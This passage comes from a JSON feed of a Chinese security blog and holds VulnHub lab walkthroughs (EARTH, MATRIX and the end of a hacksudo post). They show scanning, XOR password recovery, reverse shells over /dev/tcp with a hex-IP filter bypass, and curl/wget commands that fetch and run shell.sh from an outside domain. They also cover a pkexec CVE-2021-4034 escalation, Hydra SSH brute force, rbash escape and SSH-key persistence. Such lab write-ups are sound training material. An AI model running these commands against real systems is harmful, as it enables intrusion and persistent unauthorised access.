start=\"2\">\n<li>客户端操作：</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载私钥：</span> </span><br><span class=\"line\">scp hacksudo@192.168.31.141:~/.ssh/id_rsa.</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">改变文件权限：</span></span><br><span class=\"line\">chmod 700 vulnhub_hacksudo</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">免密登陆服务器：</span></span><br><span class=\"line\">ssh hacksudo@192.168.31.141 -i ~/.ssh/vulnhub_hacksudo</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>靶机消除痕迹</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">销毁服务端的痕迹：</span></span><br><span class=\"line\">rm -f ~/.ssh/id_rsa &amp;&amp; rm -f ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-045.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 免密登陆 root 失败，但可以免密登陆账户 hacksudo</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下次登陆此服务器需要</span> </span><br><span class=\"line\">ssh hacksudo@192.168.31.141</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在hacksudo账户内使用如下命令可直接进入root</span></span><br><span class=\"line\">lxc exec mycontainer /bin/sh </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/105%20EARTH/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/105%20EARTH/",
            "title": "VULNHUB 5 EARTH",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtZWFydGgsNzU1Lw==\">https://www.vulnhub.com/entry/the-planets-earth,755/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbGVjYWxpZGEvYXJ0aWNsZS9kZXRhaWxzLzEyMTMxNjkzNA==\">https://blog.csdn.net/valecalida/article/details/121316934</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 EARTH：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-060.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-061.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.67</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31. 67 -oN /tmp/earth.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-062.png\" alt></p>\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 Hosts</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjc=\">http://192.168.31.67</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjY3\">https://192.168.31.67</span> 发现两个网址都无法打开<br>\n注意到端口扫描的结果中， 443 中有如下说明：<br>\nSubject Alternative Name: DNS:earth.local, DNS:terratest.earth.local<br>\n 尝试修改本地 hosts 文件，将这两个域名解析指向 192.168.31.67</p>\n<p><code>sudo echo ‘192.168.31.67 earth.local terratest.earth.local’ &gt;&gt; /etc/hosts</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-063.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 更多信息暴露，有了更多的攻击面：<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsLw==\">http://earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lYXJ0aC5sb2NhbC8=\">https://earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3RlcnJhdGVzdC5lYXJ0aC5sb2NhbC8=\">http://terratest.earth.local/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwv\">https://terratest.earth.local/</span></p>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsLw==\">http://earth.local/</span></p>\n<p>对此网站进行目录扫描<br>\n <code>dirsearch -u http://earth.local</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-064.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"弱口令测试\"><a class=\"markdownIt-Anchor\" href=\"#弱口令测试\">#</a> 弱口令测试</h3>\n<p>登录地址：<span class=\"exturl\" data-url=\"aHR0cDovL2VhcnRoLmxvY2FsL2FkbWluL2xvZ2lu\">http://earth.local/admin/login</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-065.png\" alt></p>\n<h3 id=\"其他网址测试\"><a class=\"markdownIt-Anchor\" href=\"#其他网址测试\">#</a> 其他网址测试</h3>\n<p>对其他三个网站进行目录扫描</p>\n<p><code>dirsearch -u https://earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-066.png\" width=\"380\" alt=\"Image\">\n<p><code>dirsearch -u http://terratest.earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-067.png\" width=\"380\" alt=\"Image\">\n<p><code>dirsearch -u https://terratest.earth.local/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-068.png\" width=\"340\" alt=\"Image\">\n<p>-&gt; 发现目录：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvcm9ib3RzLnR4dA==\">https://terratest.earth.local/robots.txt</span></p>\n<p>对 https://terratest.earth.local/robots.txt 进行分析</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-069.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 发现可疑地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGluZ25vdGVzLnR4dA==\">https://terratest.earth.local/testingnotes.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-070.png\" width=\"480\" alt=\"Image\">\n<p>下一步攻击思路，首页打开的数字字母的排列组合是 xor 加密运算</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-071.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGRhdGEudHh0\">https://terratest.earth.local/testdata.txt</span> 为测试加密数据</p>\n<p>管理用户中有管理员：terra</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-072.png\" alt></p>\n<h3 id=\"xor-加密破解\"><a class=\"markdownIt-Anchor\" href=\"#xor-加密破解\">#</a> Xor 加密破解</h3>\n<p>编写 python 脚本，以 testdata.txt 为密钥，并注意删除其后面的空行，对首页得到的三份数据进行解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 1.py &lt;&lt; EOF</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">data1 =</span><br><span class=\"line\">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><span class=\"line\">f = binascii.b2a_hex(open(&#x27;testdata.txt&#x27;, &#x27;rb&#x27;).read()).decode()</span><br><span class=\"line\">print(hex(int(data1,16) ^ int(f,16)))</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-073.png\" alt></p>\n<p>在线 16 进制数据转为字符串：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hYjE3My5jb20vY29udmVydC9veDJzdHIucGhw\">http://www.ab173.com/convert/ox2str.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-074.png\" alt></p>\n<p>-&gt; 去掉重复值得到：earthclimatechangebad4humans</p>\n<h3 id=\"账户密码利用\"><a class=\"markdownIt-Anchor\" href=\"#账户密码利用\">#</a> 账户密码利用</h3>\n<ol>\n<li>已有凭据<br>\n现在已成功拥有账户：terra<br>\n 密码：earthclimatechangebad4humans<br>\n 尝试进行连接：ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnRlcnJhQDE5Mi4xNjguMzEuNjc=\">terra@192.168.31.67</span></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-075.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 排除掉这是 ssh 的用户和密码</p>\n<ol start=\"2\">\n<li>从之前得到的网址尝试登陆<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lYXJ0aC5sb2NhbC9hZG1pbi9sb2dpbg==\"> https://earth.local/admin/login</span></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-076.png\" alt></p>\n<ol start=\"3\">\n<li>登陆成功，发现 RCE 代码执行漏洞</li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-077.png\" alt></p>\n<h3 id=\"rce-漏洞反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#rce-漏洞反弹shell\">#</a> RCE 漏洞反弹 shell</h3>\n<ol>\n<li>从之前得到的网址尝试登陆</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从最基础的反弹shell的命令尝试发现被过滤：</span></span><br><span class=\"line\">bash -c &quot;bash -i&gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">这里过滤的是ip地址，可将ip地址改为十六进制绕过：</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x1f.0x87/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者连接到有域名的网址 [http://www.chentuo.asia](http://www.chentuo.asia)</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">采用以下几种方法尝试下马执行</span></span><br><span class=\"line\">wget http://www.chentuo.asia/shell.sh &amp;&amp; chmod +x shell.sh &amp;&amp; ./shell.sh</span><br><span class=\"line\">wget http://www.chentuo.asia/shell.sh &amp;&amp; sh shell.sh</span><br><span class=\"line\">curl http://www.chentuo.asia/shell.sh | bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-078.png\" alt></p>\n<ol start=\"2\">\n<li>得到一个标准的 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-079.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"pkexec-权限提升\"><a class=\"markdownIt-Anchor\" href=\"#pkexec-权限提升\">#</a> Pkexec 权限提升</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看靶机上的pkexec是否存在s权限：</span></span><br><span class=\"line\">ls - Alh `which pkexec`</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在攻击机kali上下载poc：</span></span><br><span class=\"line\">wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解压poc：</span></span><br><span class=\"line\">unzip master.zip</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从靶机上获取poc：</span></span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/pkexec/CVE-2021-4034-main /tmp</span><br><span class=\"line\">cd /tmp/CVE-2021-4034-main &amp;&amp; make &amp; ./CVE-2021-4034</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-080.png\" width=\"620\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取标准 shell</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-081.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#密钥对维权\">#</a> 密钥对维权</h3>\n<p>提前准备好配对好的私钥和公钥，将公钥发到靶机</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; rm -f id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-082.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-083.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; 免密成功，下次可直接登录</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/108%20MATRIX/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/108%20MATRIX/",
            "title": "VULNHUB 8 MATRIX",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbWF0cml4LTEsMjU5Lw==\">https://www.vulnhub.com/entry/matrix-1,259/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU4MzYzNy9hcnRpY2xlL2RldGFpbHMvMTAyODQ1ODYw\">https://blog.csdn.net/weixin_43583637/article/details/102845860</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 MATRIX：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-128.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.107</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.107 -oN /tmp/matrix.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-129.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22, 80, 31337</p>\n<h3 id=\"80-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#80-网站信息收集\">#</a> 80 网站信息收集</h3>\n<p>右键发现无法检查源代码，先扫一遍目录<br>\n <code>dirsearch -u http://192.168.31.107/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-130.png\" width=\"310\" alt=\"Image\">\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cw==\">http://192.168.31.107/assets</span><br>\n-&gt; 找到敏感目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cy9pbWcvcDBydF8zMTMzNy5wbmc=\">http://192.168.31.107/assets/img/p0rt_31337.png</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-131.png\" alt></p>\n<p>但是没有找到更多可以操作的，转到下个目标</p>\n<h3 id=\"31337-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#31337-网站信息收集\">#</a> 31337 网站信息收集</h3>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-132.png\" alt></p>\n<p>这里有一个提示暗号的意思，右键检查源代码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-133.png\" alt></p>\n<p>发现一串 base64 加密的字符，通过终端解密此密文</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&quot; | base64 -d</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-134.png\" alt></p>\n<p>-&gt; 得到文件名为 Cypher.matrix 的提示文件</p>\n<p>尝试访问 http://192.168.31.107:31337/Cypher.matrix</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-135.png\" alt></p>\n<p>下载后得到一个文件</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-136.png\" alt></p>\n<h3 id=\"brainfuck-解密\"><a class=\"markdownIt-Anchor\" href=\"#brainfuck-解密\">#</a> Brainfuck 解密</h3>\n<p>这是一个 brainfuck 加密，直接在线解密<br>\n解密网址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-137.png\" alt></p>\n<p>-&gt; 用户名:guest 密码：k1ll0rXX<br>\n 最后两位 XX 是未知的，需要进行爆破</p>\n<h3 id=\"crunch-生成字典\"><a class=\"markdownIt-Anchor\" href=\"#crunch-生成字典\">#</a> Crunch 生成字典</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看字典生成规则的lst文件</span></span><br><span class=\"line\">cat /usr/share/crunch/charset.lst ｜ grep lalpha</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-138.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ &gt; pass.dic</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Usage: crunch &lt;min&gt; &lt;max&gt; [options]. <span class=\"built_in\">where</span> min and max are numbers</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-f /path/to/charset.lst charset-name</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-139.png\" width=\"630\" alt=\"Image\">\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> Hydra 爆破 SSH</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-l 指定用户guest -P 指定字典 -f 爆破密码成功后停止</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-vV 显示详细过程 -o将爆破成功信息保存到文件中</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-140.png\" width=\"600\" alt=\"Image\">\n<p><img data-src=\"/N1h1l157/VULNHUB/image-141.png\" alt></p>\n<p>-&gt; 用户名:guest 密码：k1ll0r7n</p>\n<h3 id=\"rbash逃逸\"><a class=\"markdownIt-Anchor\" href=\"#rbash逃逸\">#</a> Rbash 逃逸</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ssh登陆到此台服务器</span></span><br><span class=\"line\">ssh guest@192.168.31.107 k1ll0r7n</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-142.png\" width=\"470\" alt=\"Image\">\n<p>发现此会话窗口是 rbash，即做了限制的 bash</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前环境变量</span></span><br><span class=\"line\">echo $PATH</span><br><span class=\"line\">echo /home/guest/prog/*</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-143.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现当前只能使用vi，尝试使用vi逃逸rbash</span></span><br><span class=\"line\">vi test 然后ESC 接着:!/bin/bash</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-144.png\" width=\"420\" alt=\"Image\">\n<p>rbash 成功升级为了 bash，但是很多命令还是没有</p>\n<h3 id=\"sudocp提权\"><a class=\"markdownIt-Anchor\" href=\"#sudocp提权\">#</a> sudo (cp) 提权</h3>\n<p>查看到正常机器上的 id 是在 /usr/bin 上，输入 /usr/bin/id 可以正常使用，而输入 id 无法正常访问，说明当前的会话窗口找不到 id 命令，要从环境变量中添加<br>\n <code>export PATH=/usr/bin:$PATH</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-145.png\" width=\"630\" alt=\"Image\">\n<p>sudo -l 查看相关的权限设置<br>\n发现 trinity 可以无密码使用 /bin/cp<br>\ncp 提权说明：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY3Av\">https://gtfobins.github.io/gtfobins/cp/</span></p>\n<figure class=\"highlight 